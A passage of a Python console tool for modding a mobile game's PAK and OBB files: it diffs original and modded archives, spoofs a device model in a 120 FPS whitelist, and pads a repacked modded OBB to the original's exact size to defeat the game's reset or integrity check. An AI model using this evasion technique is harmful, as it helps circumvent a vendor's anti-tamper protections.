            f"[cyan]📁 Searched in: {selected_folder.name}[/cyan]\n"
            f"[cyan]🔍 Search pattern: '{search_filename}'[/cyan]\n"
            f"[cyan]📄 Files searched: {total_files}[/cyan]\n"
            f"[cyan]✅ Files found: {len(found_files)}[/cyan]\n"
            f"[cyan]📂 Results saved to: {search_results_dir}[/cyan]",
            title="Search Results",
            border_style="green"
        ))
        
        if found_files:
            table = Table(title="Found Files", box=box.SIMPLE, style="green")
            table.add_column("No.", style="green", justify="center")
            table.add_column("File Name", style="white")
            table.add_column("Path", style="yellow")
            table.add_column("Size", style="cyan")
            
            for i, file_path in enumerate(found_files[:20], 1):  # Show first 20 files
                relative_path = file_path.relative_to(selected_folder)
                size = file_path.stat().st_size
                size_str = f"{size / 1024:.1f} KB" if size < 1024*1024 else f"{size / (1024*1024):.1f} MB"
                table.add_row(str(i), file_path.name, str(relative_path), size_str)
            
            if len(found_files) > 20:
                table.add_row("...", f"... and {len(found_files) - 20} more files", "...", "...")
            
            console.print(table)
        else:
            console.print(Panel(
                f"[yellow]⚠ No files found matching pattern: '{search_filename}'[/yellow]",
                title="No Results",
                border_style="yellow"
            ))
        
    except ValueError:
        console.print(Panel("[red]❌ Invalid input[/red]", title="Error", border_style="red"))
    except Exception as e:
        console.print(Panel(f"[red]❌ Search failed: {e}[/red]", title="Error", border_style="red"))
        traceback.print_exc()
    
    Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")

# =============== COMPARE DAT FILES FUNCTIONS ===============

import hashlib
from pathlib import Path

def quick_block_fingerprint(pak_path: Path, entry):
    """
    Fast fingerprint using first 1KB of each compressed block
    No decrypt, no decompress
    """
    h = hashlib.md5()

    indices = PakCrypto.generate_block_indices(
        len(entry.compressed_blocks),
        entry.encryption_method
    )

    with open(pak_path, "rb") as f:
        for real_idx in indices:
            block = entry.compressed_blocks[real_idx]
            f.seek(block.start)

            size = block.end - block.start
            data = f.read(min(1024, size))  # sirf 1KB
            h.update(data)

    return h.digest()

def fast_compare_and_extract_with_choice(folder_type: str):

    console.print(Panel(
        "[cyan]⚡ Fast PAK Compare + Smart Extract[/cyan]",
        title="Fast Compare",
        border_style="cyan"
    ))

    compare_dir = BASE_DIR / folder_type / "COMPARE_DAT"
    original_dir = compare_dir / "Original_PAK"
    modded_dir   = compare_dir / "Modded_PAK"
    output_dir   = compare_dir / "Modified_Files"

    for d in [original_dir, modded_dir, output_dir]:
        d.mkdir(parents=True, exist_ok=True)

    original_paks = list(original_dir.glob("*.pak"))
    modded_paks   = list(modded_dir.glob("*.pak"))

    if not original_paks or not modded_paks:
        console.print("[red]❌ Original / Modded PAK missing[/red]")
        Prompt.ask("Press Enter...", default="")
        return

    # ---------- PAK SELECTION ----------

    def choose_pak(paks, title):
        console.print(f"\n[cyan]{title}[/cyan]")
        for i, p in enumerate(paks, 1):
            console.print(f"  [{i}] {p.name}")
        try:
            idx = int(Prompt.ask("Select number")) - 1
            return paks[idx]
        except:
            return None

    orig_pak = choose_pak(original_paks, "Select Original PAK")
    if not orig_pak:
        return

    mod_pak = choose_pak(modded_paks, "Select Modded PAK")
    if not mod_pak:
        return

    console.print("\n[yellow]🔄 Loading PAK indexes...[/yellow]")
    orig = TencentPakFile(orig_pak)
    mod  = TencentPakFile(mod_pak)

    # ---------- MODE ----------

    console.print("\n[cyan]Extraction Mode[/cyan]")
    console.print("  1️⃣ Normal Unpack")
    console.print("  2️⃣ Chunk Unpack")

    mode = Prompt.ask(
        "Choose mode",
        choices=["1", "2"],
        default="1"
    )

    modified = []

    console.print("\n[yellow]⚡ Fast Comparing (metadata + fingerprint)...[/yellow]")

    for dir_path, orig_files in orig._index.items():
        mod_files = mod._index.get(dir_path)
        if not mod_files:
            continue

        for name, o_entry in orig_files.items():
            m_entry = mod_files.get(name)
            if not m_entry:
                continue

            same = True

            # ---- metadata checks ----
            if o_entry.uncompressed_size != m_entry.uncompressed_size:
                same = False

            elif len(o_entry.compressed_blocks) != len(m_entry.compressed_blocks):
                same = False

            else:
                for ob, mb in zip(o_entry.compressed_blocks, m_entry.compressed_blocks):
                    if (ob.end - ob.start) != (mb.end - mb.start):
                        same = False
                        break

            # ---- fingerprint fallback ----
            if same:
                orig_fp = quick_block_fingerprint(orig_pak, o_entry)
                mod_fp  = quick_block_fingerprint(mod_pak,  m_entry)

                if orig_fp == mod_fp:
                    continue
                else:
                    same = False

            if same:
                continue

            modified.append((dir_path, name, m_entry))

    if not modified:
        console.print("[green]✅ No modified files found[/green]")
        Prompt.ask("Press Enter...", default="")
        return

    console.print(
        f"[bold green]✅ Modified Files Found:[/] {len(modified)}\n"
        f"[cyan]Starting extraction...[/cyan]"
    )

    # ---------- EXTRACTION ----------

    for dir_path, name, entry in modified:

        # generate correct block order
        indices = PakCrypto.generate_block_indices(
            len(entry.compressed_blocks),
            entry.encryption_method
        )

        # ===== NORMAL UNPACK (SAFE) =====
        if mode == "1":
            full_data = b""

            with open(mod_pak, "rb") as f:
                for real_idx in indices:
                    block = entry.compressed_blocks[real_idx]
                    f.seek(block.start)

                    raw_size = block.end - block.start
                    if entry.encrypted:
                        read_size = PakCrypto.align_encrypted_content_size(
                            raw_size,
                            entry.encryption_method
                        )
                    else:
                        read_size = raw_size

                    data = f.read(read_size)

                    if entry.encrypted:
                        data = PakCrypto.decrypt_block(
                            data,
                            Path(name),
                            entry.encryption_method
                        )

                    if entry.compression_method != const.CM_NONE:
                        data = PakCompression.decompress_block(
                            data,
                            mod._zstd_dict,
                            entry.compression_method
                        )

                    full_data += data

            out_path = output_dir / dir_path / name
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_bytes(full_data)

            console.print(f"[green]✔ Unpacked:[/] {name}")

        # ===== CHUNK UNPACK =====
        else:
            file_base = Path(name).stem
            file_ext  = Path(name).suffix

            chunk_dir = output_dir / "CHUNK_UNPACK" / file_base
            chunk_dir.mkdir(parents=True, exist_ok=True)

            with open(mod_pak, "rb") as f:
                for i, real_idx in enumerate(indices):

                    block = entry.compressed_blocks[real_idx]
                    f.seek(block.start)

                    raw_size = block.end - block.start
                    if entry.encrypted:
                        read_size = PakCrypto.align_encrypted_content_size(
                            raw_size,
                            entry.encryption_method
                        )
                    else:
                        read_size = raw_size

                    data = f.read(read_size)

                    if entry.encrypted:
                        data = PakCrypto.decrypt_block(
                            data,
                            Path(name),
                            entry.encryption_method
                        )

                    if entry.compression_method != const.CM_NONE:
                        data = PakCompression.decompress_block(
                            data,
                            mod._zstd_dict,
                            entry.compression_method
                        )

                    out_file = chunk_dir / f"{file_base}_{i}{file_ext}"
                    out_file.write_bytes(data)

            console.print(f"[green]✔ Chunk Unpacked:[/] {name}")

    console.print(
        Panel(
            f"[bold green]🎉 DONE[/bold green]\n"
            f"[cyan]Modified Files Extracted:[/] {len(modified)}",
            border_style="green"
        )
    )

    Prompt.ask("[white]Press Enter to continue...[/white]", default="")

# =============== AUTO 120 FPS FUNCTIONS ===============

def create_auto_120fps(base_dir: Path, user_model: str) -> bool:
    """Create auto 120fps modification for the user's device model."""
    console.print(Panel(
        f"[blue]🎮 Creating Auto 120FPS for model: {user_model}[/blue]",
        title="Auto 120FPS",
        border_style="blue"
    ))
    
    # Define paths - using GAMEPATCH folder structure
    fps_mapping_source = base_dir / 'GAMEPATCH' / 'UNPACKED' / 'game_patch_4.2.0.20750' / 'ShadowTrackerExtra' / 'Content' / 'CSV' / 'Client120FPSMapping.uexp'
    fps_mapping_dest_dir = base_dir / 'GAMEPATCH' / 'EDITED' / 'Content' / 'CSV'
    fps_mapping_dest = fps_mapping_dest_dir / 'Client120FPSMapping.uexp'
    
    # Check if source file exists
    if not fps_mapping_source.exists():
        console.print(Panel(
            f"[red]❌ FPS mapping file not found: {fps_mapping_source}[/red]\n"
            f"[cyan]💡 Please make sure you have unpacked the game patch first using GAME PATCH TOOL.[/cyan]",
            title="Error",
            border_style="red"
        ))
        return False
    
    # Create destination directory
    fps_mapping_dest_dir.mkdir(parents=True, exist_ok=True)
    
    try:
        # Read the original file
        with open(fps_mapping_source, 'rb') as f:
            data = bytearray(f.read())
        
        console.print("[cyan]🔍 Scanning for 120FPS models...[/cyan]")
        
        # List of known 120FPS models from the file structure
        known_120fps_models = [
            "Infinix X6871",
            "Infinix X6871", 
            "XT2507-2",
            "CPH2613",
            "CPH2661",
            "V2241HA",
            "RMX5061",
            "NX712J",
            "XT2301-5",
            "M381Q",
            "PGT-AN20",
            "NX733J",
            "23046RP50C",
            "PJJ110",
            "24069PC21G",
            "NP03J",
            "NX769J",
            "V2332A",
            "A024",
            "OPD2415",
            "RMX5061",
            "PGFM10",
            "V2337A",
            "V2359A",
            "V2366GA",
            "V2217A",
            "PJD110",
            "PKC110",
            "PJE110",
            "25010PN30G",
            "24129PN74G",
            "A065",
            "SM-S926B",
            "A001",
            "Infinix X6871",
            "Infinix X6871",
            "A059",
            "Infinix X6871",
            "V2243A",
            "RMX5032",
            "ASUS_AI2205_C",
            "MEIZU 20",
            "V2232A",
            "25010PN30C",
            "I2405",
            "PKX110",
            "PLM110",
            "PLE110",
            "24069PC21I",
            "SM-S721B",
            "XT2507-2",
            "RMX5085",
            "SM-S937B",
            "motorola edge 60 pro",
            "RMX5030",
            "RMX5210",
            "RMX3851",
            "PLG110"
        ]
        
        # Try to find and replace each known 120FPS model
        replacement_done = False
        
        for target_model in known_120fps_models:
            old_bytes = target_model.encode('utf-8')
            new_bytes = user_model.encode('utf-8')
            
            # Only replace if the new model is not longer than the old one
            if len(new_bytes) <= len(old_bytes) and old_bytes in data:
                # Find all occurrences
                start_index = 0
                found_count = 0
                
                while True:
                    index = data.find(old_bytes, start_index)
                    if index == -1:
                        break
                    
                    # Check if this is followed by 120FPS pattern (not 90FPS)
                    # Look ahead to see if this has 120|120 pattern
                    check_ahead = data[index + len(old_bytes):index + len(old_bytes) + 50]
                    
                    # Check for 120FPS pattern: usually followed by \x04\x00\x00\x00120\x08\x00\x00\x00120|120
                    if b'120' in check_ahead and b'90' not in check_ahead:
                        # Replace this occurrence
                        data[index:index + len(old_bytes)] = new_bytes + b'\x00' * (len(old_bytes) - len(new_bytes))
                        console.print(f"[green]✅ Replaced '{target_model}' with '{user_model}'[/green]")
                        replacement_done = True
                        found_count += 1
                        break
                    
                    start_index = index + 1
                
                if replacement_done:
                    break
        
        if not replacement_done:
            console.print("[yellow]⚠ No suitable 120FPS model found for replacement[/yellow]")
            console.print("[cyan]🔄 Trying alternative method...[/cyan]")
            
            # Alternative: Just find any model and replace it
            for target_model in known_120fps_models:
                old_bytes = target_model.encode('utf-8')
                new_bytes = user_model.encode('utf-8')
                
                if len(new_bytes) <= len(old_bytes) and old_bytes in data:
                    index = data.find(old_bytes)
                    if index != -1:
                        data[index:index + len(old_bytes)] = new_bytes + b'\x00' * (len(old_bytes) - len(new_bytes))
                        console.print(f"[green]✅ Replaced '{target_model}' with '{user_model}' (alternative method)[/green]")
                        replacement_done = True
                        break
        
        if not replacement_done:
            console.print("[red]❌ Could not find any model to replace[/red]")
            return False

        # Write modified file
        with open(fps_mapping_dest, 'wb') as f:
            f.write(data)
        
        console.print(f"[green]✅ Auto 120FPS file created: {fps_mapping_dest}[/green]")
        return True
        
    except Exception as e:
        console.print(Panel(
            f"[red]❌ Failed to create Auto 120FPS: {e}[/red]",
            title="Error",
            border_style="red"
        ))
        traceback.print_exc()
        return False

def process_auto_120fps(base_dir: Path) -> None:
    """Process auto 120fps creation and automatic repacking."""
    console.print(Panel(
        "[blue]🎮 Auto 120FPS Feature[/blue]",
        title="120FPS Setup",
        border_style="blue"
    ))
    
    # Get user model
    user_model = Prompt.ask("[white]Enter your device model[/white]", console=console).strip()
    if not user_model:
        console.print(Panel("[red]❌ No model entered[/red]", title="Error", border_style="red"))
        return
    
    # Check if game patch is unpacked first
    unpacked_dir = base_dir / 'GAMEPATCH' / 'UNPACKED'
    if not unpacked_dir.exists() or not any(unpacked_dir.iterdir()):
        console.print(Panel(
            f"[red]❌ Game patch not unpacked![/red]\n"
            f"[cyan]💡 Please unpack game patch first using GAME PATCH TOOL option 1.[/cyan]",
            title="Error",
            border_style="red"
        ))
        return
    
    # Create auto 120fps modification
    if not create_auto_120fps(base_dir, user_model):
        return
    
    # Find game patch file for repacking
    input_dir = base_dir / 'GAMEPATCH' / 'INPUT'
    if not input_dir.exists():
        console.print(Panel(f"[red]❌ Input folder not found: {input_dir}[/red]", title="Error", border_style="red"))
        return
    
    possible_paks = list(input_dir.glob("*.pak"))
    candidates = [p for p in possible_paks if 'patch' in p.name.lower()]
    
    if not candidates:
        console.print(Panel(
            f"[red]❌ No game patch .pak files found in {input_dir}![/red]",
            title="Error",
            border_style="red"
        ))
        return
    
    # Use the first candidate or let user select
    pak_file = candidates[0]
    if len(candidates) > 1:
        table = Table(title="Game Patches", box=box.SIMPLE, style="cyan")
        table.add_column("No.", style="cyan", justify="center")
        table.add_column("File Name", style="white")
        for i, p in enumerate(candidates, 1):
            table.add_row(str(i), p.name)
        console.print(table)
        
        try:
            selection = int(Prompt.ask(f"[white]Select patch file (1-{len(candidates)})[/white]", console=console)) - 1
            if 0 <= selection < len(candidates):
                pak_file = candidates[selection]
            else:
                console.print(Panel("[red]❌ Invalid selection.[/red]", title="Error", border_style="red"))
                return
        except ValueError:
            console.print(Panel("[red]❌ Invalid input.[/red]", title="Error", border_style="red"))
            return
    
    # Auto repack
    mod_folder = base_dir / 'GAMEPATCH' / 'EDITED'
    output_pak = base_dir / 'GAMEPATCH' / 'REPACKED' / f"{pak_file.stem}.pak"
    
    console.print(Panel(
        f"[blue]🔄 Auto-repacking with 120FPS modification...[/blue]",
        title="Repacking",
        border_style="blue"
    ))
    
    try:
        pak_instance = TencentPakFile(pak_file, is_od=False)
        pak_instance.repack(mod_folder, output_pak)
        console.print(Panel(
            f"[green]✅ Auto 120FPS complete! Modified PAK saved to: {output_pak}[/green]",
            title="Success",
            border_style="green"
        ))
    except Exception as e:
        console.print(Panel(f"[red]❌ Auto repack failed: {e}[/red]", title="Error", border_style="red"))
        traceback.print_exc()

def handle_auto_120fps():
    """Handle Auto 120 FPS feature."""
    show_banner()
    
    # Check prerequisites
    gamepatch_input = BASE_DIR / 'GAMEPATCH' / 'INPUT'
    gamepatch_unpacked = BASE_DIR / 'GAMEPATCH' / 'UNPACKED'
    
    if not any(gamepatch_input.glob("*.pak")):
        console.print(Panel(
            f"[red]❌ No game patch files found![/red]\n"
            f"[cyan]💡 Please place game patch .pak files in {gamepatch_input} first.[/cyan]",
            title="Error",
            border_style="red"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    if not gamepatch_unpacked.exists() or not any(gamepatch_unpacked.iterdir()):
        console.print(Panel(
            f"[red]❌ Game patch not unpacked![/red]\n"
            f"[cyan]💡 Please unpack game patch first using GAME PATCH TOOL option 1.[/cyan]",
            title="Error",
            border_style="red"
        ))
        
        # Ask if user wants to unpack now
        unpack_now = Prompt.ask(
            "[yellow]Do you want to unpack game patch now? (y/n)[/yellow]",
            choices=['y', 'n'],
            console=console
        ).lower()
        
        if unpack_now == 'y':
            # Auto-select and unpack the first game patch
            pak_files = list(gamepatch_input.glob("*.pak"))
            if pak_files:
                pak_file = pak_files[0]
                console.print(Panel(
                    f"[blue]📁 Auto-unpacking: {pak_file.name}[/blue]",
                    title="Unpacking",
                    border_style="blue"
                ))
                
                try:
                    pak_instance = TencentPakFile(pak_file, is_od=False)
                    output_folder = BASE_DIR / 'GAMEPATCH' / 'UNPACKED' / pak_file.stem
                    pak_instance.dump(output_folder)
                    console.print(Panel(
                        f"[green]✅ Unpack complete![/green]\n"
                        f"[cyan]📁 Files extracted to: {output_folder}[/cyan]",
                        title="Success",
                        border_style="green"
                    ))
                except Exception as e:
                    console.print(Panel(f"[red]❌ Unpack failed: {e}[/red]", title="Error", border_style="red"))
                    traceback.print_exc()
                    return
            else:
                console.print(Panel("[red]❌ No .pak files found[/red]", title="Error", border_style="red"))
                return
        else:
            return
    
    # Show Auto 120FPS options
    console.print(Panel(
        "[blue]🎮 Auto 120 FPS Feature[/blue]\n"
        "[yellow]This feature will modify game files to enable 120 FPS on your device.[/yellow]",
        title="Auto 120 FPS",
        border_style="blue"
    ))
    
    table = Table(title="Auto 120FPS Options", box=box.SIMPLE, style="cyan")
    table.add_column("Option", style="cyan", justify="center")
    table.add_column("Action", style="white")
    table.add_row("1", " CREATE AUTO 120FPS MOD")
    table.add_row("2", " ABOUT AUTO 120FPS")
    table.add_row("0", " BACK TO MAIN MENU")
    console.print(table)
    
    try:
        choice = Prompt.ask("[white]Select option (1-3)[/white]", console=console).strip()
    except KeyboardInterrupt:
        return
    
    if choice == "1":
        process_auto_120fps(BASE_DIR)
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
    elif choice == "2":
        console.print(Panel(
            "[green]📖 Auto 120FPS Information[/green]\n\n"
            "[cyan]🎯 What it does:[/cyan]\n"
            "• Modifies the FPS mapping file to enable 120 FPS on your device\n"
            "• Replaces existing 120FPS-enabled device models with your model\n"
            "• Automatically repacks the game patch with the modification\n\n"
            "[cyan]📋 Requirements:[/cyan]\n"
            "• Game patch .pak file in GAMEPATCH/INPUT folder\n"
            "• Unpacked game patch in GAMEPATCH/UNPACKED folder\n"
            "• Your exact device model name\n\n"
            "[cyan]⚡ Supported Devices:[/cyan]\n"
            "• Various Samsung, Xiaomi, OPPO, Realme, Vivo devices\n"
            "• And many other 120FPS-capable devices\n\n"
            "[yellow]💡 Tip: Enter your exact device model as shown in settings[/yellow]",
            title="About Auto 120FPS",
            border_style="green"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
    elif choice == "0":
        return
    else:
        console.print(Panel("[red]❌ Invalid option[/red]", title="Error", border_style="red"))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")

# =============== ANTIRESET OBB TOOL FUNCTIONS ===============

def create_antireset_directories():
    """Create required directories for ANTIRESET tool"""
    base_dir = BASE_DIR / "ANTIRESET"
    org_dir = base_dir / "ORG_OBB"
    mod_dir = base_dir / "MODDED_OBB"
    unzipped_dir = base_dir / "UNZIPPED"
    config_dir = base_dir / "CONFIG"
    
    for directory in [base_dir, org_dir, mod_dir, unzipped_dir, config_dir]:
        if not os.path.exists(directory):
            os.makedirs(directory)
    
    return org_dir, mod_dir, unzipped_dir, config_dir

def get_obb_info_json_path(config_dir, obb_stem):
    """Get path for OBB info JSON file"""
    return config_dir / f"{obb_stem}_info.json"

def save_obb_info(config_dir, obb_name, obb_stem, extract_dir, target_size, org_obb_name):
    """Save OBB extraction info to JSON"""
    info = {
        "obb_name": obb_name,
        "obb_stem": obb_stem,
        "extract_dir": str(extract_dir),
        "unzipped": True,
        "org_obb_name": org_obb_name,
        "target_size": target_size,
        "created_at": datetime.now().isoformat()
    }
    json_path = get_obb_info_json_path(config_dir, obb_stem)
    with open(json_path, 'w') as f:
        json.dump(info, f, indent=2)
    return json_path

def load_obb_info(config_dir, obb_stem):
    """Load OBB info from JSON"""
    json_path = get_obb_info_json_path(config_dir, obb_stem)
    if json_path.exists():
        with open(json_path, 'r') as f:
            return json.load(f)
    return None

def list_obb_files(directory, folder_name):
    """List .obb files in directory"""
    obb_files = [f for f in os.listdir(directory) if f.endswith('.obb')]
    
    if not obb_files:
        console.print(f"❌ [red]No .obb files found in {folder_name}[/red]")
        return None
    
    console.print(f"\n📂 [bold cyan]Available .obb files in {folder_name}:[/bold cyan]")
    for i, file in enumerate(obb_files, 1):
        file_path = os.path.join(directory, file)
        try:
            file_size = os.path.getsize(file_path)
            size_mb = file_size / (1024 * 1024)
            console.print(f"   {i}. {file} ({size_mb:.2f} MB)")
        except:
            console.print(f"   {i}. {file} (Size unknown)")
    
    return obb_files

def select_obb_file(obb_files, folder_name):
    """Let user select an OBB file"""
    while True:
        try:
            choice = console.input(f"\n🔢 [cyan]Select .obb file from {folder_name} (1-{len(obb_files)}): [/cyan]")
            if choice.isdigit():
                choice_num = int(choice)
                if 1 <= choice_num <= len(obb_files):
                    return obb_files[choice_num - 1]
                else:
                    console.print(f"❌ [red]Please enter number between 1 and {len(obb_files)}[/red]")
            else:
                console.print("❌ [red]Please enter a valid number[/red]")
        except KeyboardInterrupt:
            return None

def get_original_obb_size(org_obb_path):
    """Get original OBB file size"""
    try:
        size = os.path.getsize(org_obb_path)
        return size
    except Exception as e:
        console.print(f"❌ [red]Error reading ORG OBB: {e}[/red]")
        return None

def unzip_modded_obb(mod_obb_path, extract_dir):
    """
    Extract modded OBB (which is actually a ZIP file)
    Uses STORE method compatible extraction
    """
    try:
        # Clear extract directory if exists
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)
        os.makedirs(extract_dir, exist_ok=True)
        
        console.print(f"\n[cyan]📦 Extracting {os.path.basename(mod_obb_path)}...[/cyan]")
        
        # Open as ZIP and extract
        with zipfile.ZipFile(mod_obb_path, 'r') as zip_ref:
            file_list = zip_ref.namelist()
            total_files = len(file_list)
            
            with Progress(
                BarColumn(),
                TextColumn("[progress.description]{task.description}"),
                TaskProgressColumn(),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Extracting...", total=total_files)
                
                for file_name in file_list:
                    zip_ref.extract(file_name, extract_dir)
                    progress.update(task, advance=1)
        
        # Delete the original OBB file after extraction
        os.remove(mod_obb_path)
        console.print(f"[green]✅ Deleted original OBB: {os.path.basename(mod_obb_path)}[/green]")
        
        return True
        
    except zipfile.BadZipFile:
        console.print("[red]❌ Invalid OBB file (not a valid ZIP archive)[/red]")
        return False
    except Exception as e:
        console.print(f"[red]❌ Extraction failed: {e}[/red]")
        return False

def zip_with_store_compression(source_dir, output_obb_path):
    """
    Create OBB with STORE compression (no compression, just storage)
    This is critical for anti-reset to work properly
    """
    try:
        # Collect all files to zip
        all_files = []
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_dir)
                all_files.append((file_path, arcname))
        
        total_files = len(all_files)
        
        # Create ZIP with STORE compression
        with zipfile.ZipFile(output_obb_path, 'w', zipfile.ZIP_STORED) as zipf:
            with Progress(
                BarColumn(),
                TextColumn("[progress.description]{task.description}"),
                TaskProgressColumn(),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Zipping (STORE)...", total=total_files)
                
                for file_path, arcname in all_files:
                    zipf.write(file_path, arcname)
                    progress.update(task, advance=1)
        
        return True
        
    except Exception as e:
        console.print(f"[red]❌ Zipping failed: {e}[/red]")
        return False

def add_padding_to_obb(obb_path, target_size):
    """Add padding bytes to match target size"""
    try:
        current_size = os.path.getsize(obb_path)
        
        if current_size > target_size:
            console.print(f"[yellow]⚠ Warning: Zipped size ({current_size:,} bytes) > Target size ({target_size:,} bytes)[/yellow]")
            return False
        
        if current_size == target_size:
            console.print(f"[green]✅ Size already matches![/green]")
            return True
        
        bytes_needed = target_size - current_size
        kb_needed = bytes_needed / 1024
        
        console.print(f"\n[cyan]📊 Padding needed: {kb_needed:.2f} KB ({bytes_needed:,} bytes)[/cyan]")
        
        # Add padding
        with open(obb_path, 'ab') as f:
            chunk_size = 1024 * 1024  # 1MB chunks
            remaining = bytes_needed
            
            with Progress(
                BarColumn(),
                TextColumn("[progress.description]{task.description}"),
                TaskProgressColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Adding padding...", total=bytes_needed)
                
                while remaining > 0:
                    chunk = min(chunk_size, remaining)
                    f.write(b'\x00' * chunk)
                    remaining -= chunk
                    progress.update(task, advance=chunk)
        
        new_size = os.path.getsize(obb_path)
        console.print(f"[green]✅ Final size: {new_size:,} bytes[/green]")
        
        return new_size == target_size
        
    except Exception as e:
        console.print(f"[red]❌ Padding failed: {e}[/red]")
        return False

def format_size(size_bytes):
    """Format bytes to human readable"""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.2f} KB"
    elif size_bytes < 1024 * 1024 * 1024:
        return f"{size_bytes / (1024 * 1024):.2f} MB"
    else:
        return f"{size_bytes / (1024 * 1024 * 1024):.2f} GB"

def step1_unzip_obb():
    """STEP 1: Unzip modded OBB"""
    console.print(Panel.fit(
        "📦  STEP 1 — UNZIP MODDED OBB  📦",
        border_style="cyan",
        padding=(0, 2)
    ))
    
    org_dir, mod_dir, unzipped_dir, config_dir = create_antireset_directories()
    
    # First, check if ORG OBB exists (we need it for target size)
    org_obb_files = list_obb_files(org_dir, "ORG OBB")
    if not org_obb_files:
        console.print(f"\n📝 [yellow]Please copy your original OBB file to 'ORG_OBB' folder[/yellow]")
        console.print(f"📍 [cyan]Location: {org_dir}[/cyan]")
        return False
    
    selected_org_file = select_obb_file(org_obb_files, "ORG OBB")
    if not selected_org_file:
        return False
    
    org_obb_path = os.path.join(org_dir, selected_org_file)
    target_size = get_original_obb_size(org_obb_path)
    if not target_size:
        return False
    
    console.print(f"\n[green]✔ ORG OBB: {selected_org_file} ({format_size(target_size)})[/green]")
    
    # Now handle modded OBB
    mod_obb_files = list_obb_files(mod_dir, "MODDED OBB")
    
    # If no modded OBB, copy ORG OBB to MODDED_OBB first
    if not mod_obb_files:
        console.print(f"\n[yellow]⚠ No modded OBB found. Copying ORG OBB to MODDED_OBB...[/yellow]")
        copy_choice = console.input(f"\n❓ [yellow]Copy {selected_org_file} to MODDED_OBB folder? (y/n): [/yellow]")
        if copy_choice.lower() == 'y':
            mod_obb_path = os.path.join(mod_dir, selected_org_file)
            shutil.copy2(org_obb_path, mod_obb_path)
            console.print(f"[green]✅ Copied to MODDED_OBB[/green]")
            mod_obb_files = [selected_org_file]
        else:
            console.print(f"\n📝 [yellow]Please copy your modded OBB file to 'MODDED_OBB' folder[/yellow]")
            console.print(f"📍 [cyan]Location: {mod_dir}[/cyan]")
            return False
    
    selected_mod_file = select_obb_file(mod_obb_files, "MODDED OBB")
    if not selected_mod_file:
        return False
    
    mod_obb_path = os.path.join(mod_dir, selected_mod_file)
    obb_stem = os.path.splitext(selected_mod_file)[0]
    extract_dir = unzipped_dir / obb_stem
    
    # Extract the modded OBB
    if unzip_modded_obb(mod_obb_path, extract_dir):
        # Save info for step 2
        save_obb_info(config_dir, selected_mod_file, obb_stem, extract_dir, target_size, selected_org_file)
        
        console.print(Panel(
            f"[bold green]✔ Unzip done![/bold green]\n"
            f"[cyan]📁 Extracted to: {extract_dir}[/cyan]",
            title="Success",
            border_style="green"
        ))
        return True
    else:
        return False

def step2_make_antireset():
    """STEP 2: Repack with STORE compression and match size"""
    console.print(Panel.fit(
        "🛡️  STEP 2 — MAKE ANTIRESET  🛡️",
        border_style="yellow",
        padding=(0, 2)
    ))
    
    org_dir, mod_dir, unzipped_dir, config_dir = create_antireset_directories()
    
    # Find OBB info JSON files
    json_files = list(config_dir.glob("*_info.json"))
    
    if not json_files:
        console.print(Panel(
            "[red]❌ No extraction info found![/red]\n"
            "[cyan]💡 Please run STEP 1 (Unzip OBB) first.[/cyan]",
            border_style="red"
        ))
        return False
    
    # Let user select which OBB to process
    console.print("\n[cyan]📋 Available extracted OBBs:[/cyan]")
    for i, json_file in enumerate(json_files, 1):
        with open(json_file, 'r') as f:
            info = json.load(f)
        console.print(f"   {i}. {info['obb_name']}")
    
    try:
        choice = int(console.input(f"\n🔢 [cyan]Select OBB (1-{len(json_files)}): [/cyan]"))
        if 1 <= choice <= len(json_files):
            info = json.load(open(json_files[choice - 1], 'r'))
        else:
            console.print("[red]❌ Invalid selection[/red]")
            return False
    except ValueError:
        console.print("[red]❌ Invalid input[/red]")
        return False
    
    extract_dir = Path(info['extract_dir'])
    obb_name = info['obb_name']
    obb_stem = info['obb_stem']
    target_size = info['target_size']
    org_obb_name = info.get('org_obb_name', 'unknown')
    
    # Verify extract directory exists
    if not extract_dir.exists():
        console.print(f"[red]❌ Extract directory not found: {extract_dir}[/red]")
        return False
    
    # Output OBB path
    output_obb_path = mod_dir / obb_name
    
    console.print(Panel(
        f"[cyan]📂 Extract Dir : {extract_dir.name}[/cyan]\n"
        f"[cyan]📦 OBB Name    : {obb_name}[/cyan]\n"
        f"[cyan]🎯 Target Size : {format_size(target_size)}[/cyan]",
        title="Source Info",
        border_style="cyan"
    ))
    
    # Step 2A: Zip with STORE compression
    console.print("\n[bold yellow]━━━ STEP 1/2 : ZIPPING (STORE) ━━━[/bold yellow]")
    
    # Show progress of files being added
    all_files = []
    for root, dirs, files in os.walk(extract_dir):
        for file in files:
            all_files.append(file)
    
    console.print(f"[dim]Total files to pack: {len(all_files)}[/dim]")
    
    if not zip_with_store_compression(extract_dir, output_obb_path):
        return False
    
    zipped_size = os.path.getsize(output_obb_path)
    console.print(f"\n[green]📦 Zipped size : {format_size(zipped_size)}[/green]")
    console.print(f"[yellow]🎯 Target size : {format_size(target_size)}[/yellow]")
    
    # Step 2B: Add padding if needed
    console.print("\n[bold yellow]━━━ STEP 2/2 : PADDING ━━━[/bold yellow]")
    
    if add_padding_to_obb(output_obb_path, target_size):
        final_size = os.path.getsize(output_obb_path)
        
        # Clean up: delete extract directory and JSON info
        try:
            shutil.rmtree(extract_dir)
            os.remove(json_files[choice - 1])
            console.print("[dim]🧹 Cleaned up temporary files[/dim]")
        except:
            pass
        
        console.print(Panel(
            f"[bold green]🎉 ANTIRESET OBB READY![/bold green]\n\n"
            f"[cyan]Output File  : {obb_name}[/cyan]\n"
            f"[cyan]Final Size   : {format_size(final_size)} ({final_size:,} bytes)[/cyan]\n"
            f"[cyan]Target Size  : {format_size(target_size)}[/cyan]\n"
            f"[cyan]Size Source  : ORG OBB — {org_obb_name}[/cyan]\n"
            f"[cyan]Location     : {mod_dir}[/cyan]",
